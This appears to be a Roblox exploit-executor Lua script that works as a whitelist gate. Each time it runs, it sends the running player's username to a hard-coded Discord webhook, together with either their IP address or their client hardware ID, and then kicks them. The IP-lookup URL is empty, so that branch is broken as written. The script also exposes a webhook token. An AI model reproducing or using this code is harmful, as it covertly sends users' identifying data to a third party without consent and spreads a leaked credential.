Http = game:GetService("HttpService")
Web = "https://discord.com/api/webhooks/1097605108566605884/l8miroYYk4SiEthFMLHSGo0N1ULr6bxeByari4VCpuM8cSNlcczgOCWRGB9VufBux9EA"

if syn then
    local responce = syn.request(
    {
        Url = Web,
        Method = 'POST',
        Headers = {
            ['Content-Type'] = 'application/json'
        },
        Body = Http:JSONEncode({
            ["content"] = "",
            ["embeds"] = {{
                ["title"] = "*kicked blacklisted*",
                ["description"] = game.Players.LocalPlayer.Name.. "premium",
                ["type"] = "rich",
                ["color"] = tonumber(random),
                ["fields"] = {
                    {
                        ["name"] = " Ip",
                        ["value"] =  game:HttpGet("", true),
                        ["inline"] = true
                    }
                }
                
            }}
        })
    })
   else
    request(
        {
            Url = Web,
            Method = 'POST',
            Headers = {
                ['Content-Type'] = 'application/json'
            },
            Body = Http:JSONEncode({
                ["content"] = "",
                ["embeds"] = {{
                    ["title"] = "Blacklist plr kicked",
                    ["description"] =  game.Players.LocalPlayer.Name.. " hardwareid premium",
                    ["type"] = "rich",
                    ["color"] = tonumber(random),
                    ["fields"] = {
                        {
                            ["name"] = "Hardware ID:",
							["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
                            ["inline"] = true
                        }
                    }
                    
                }}
            })
        })
    end

game.Players.LocalPlayer:Kick("not whitelisted dm for quracik")
